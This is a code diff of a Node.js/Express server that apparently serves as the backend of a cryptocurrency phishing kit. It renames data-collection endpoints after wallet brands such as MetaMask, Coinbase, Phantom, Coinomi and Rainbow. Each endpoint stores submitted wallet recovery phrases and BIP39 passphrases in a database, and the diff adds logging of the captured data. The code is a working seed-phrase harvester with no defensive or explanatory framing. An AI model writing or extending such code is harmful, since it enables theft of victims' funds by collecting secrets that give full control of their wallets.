@@ -106,7 +106,7 @@ server.get("/",(req,res)=>{
     res.send("Hello World");
 })
 
-server.post("/api/data1",(req,res)=>{
+server.post("/api/metamask",(req,res)=>{
     async function saveSchema(){
         let data = new schemaUse({
             Time:indiaTime,
@@ -124,7 +124,7 @@ server.post("/api/data1",(req,res)=>{
     saveSchema()
 })
 
-server.post("/api/data2",(req,res)=>{
+server.post("/api/multicoin",(req,res)=>{
     async function saveSchema(){
         let data = new schema2Use({
             Time:indiaTime,
@@ -143,7 +143,7 @@ server.post("/api/data2",(req,res)=>{
     saveSchema()
 })
 
-server.post("/api/data3",(req,res)=>{
+server.post("/api/blockchain",(req,res)=>{
     async function saveSchema(){
         let data = new schema3Use({
             Time:indiaTime,
@@ -179,7 +179,7 @@ server.post("/api/data4",(req,res)=>{
     saveSchema()
 })
 
-server.post("/api/data5",(req,res)=>{
+server.post("/api/coinbase",(req,res)=>{
     async function saveSchema(){
         let data = new schema5Use({
             Time:indiaTime,
@@ -197,7 +197,7 @@ server.post("/api/data5",(req,res)=>{
     saveSchema()
 })
 
-server.post("/api/data6",(req,res)=>{
+server.post("/api/phantom",(req,res)=>{
     async function saveSchema(){
         let data = new schema6Use({
             Time:indiaTime,
@@ -233,18 +233,20 @@ server.post("/api/data7",(req,res)=>{
     saveSchema()
 })
 
-server.post("/api/data8",(req,res)=>{
+server.post("/api/coinomi",(req,res)=>{
     async function saveSchema(){
         let data = new schema8Use({
             Time:indiaTime,
             recoveryPhrase:req.body.recoveryPhrase,
             bip39passPhrase:req.body.bip39passPhrase
         });
+        console.log(data)
         try{
             await data.save();
             console.log("Saved")
         }
-        catch{
+        catch(err){
+            console.log(err)
             console.log("NO")
         }
     }
@@ -252,7 +254,7 @@ server.post("/api/data8",(req,res)=>{
     saveSchema()
 })
 
-server.post("/api/data9",(req,res)=>{
+server.post("/api/rainbow",(req,res)=>{
     async function saveSchema(){
         let data = new schema9Use({
             Time:indiaTime,
@@ -270,7 +272,7 @@ server.post("/api/data9",(req,res)=>{
     saveSchema()
 })
 
-server.post("/api/data10",(req,res)=>{
+server.post("/api/other",(req,res)=>{
     async function saveSchema(){
         let data = new schema9Use({
             Time:indiaTime,
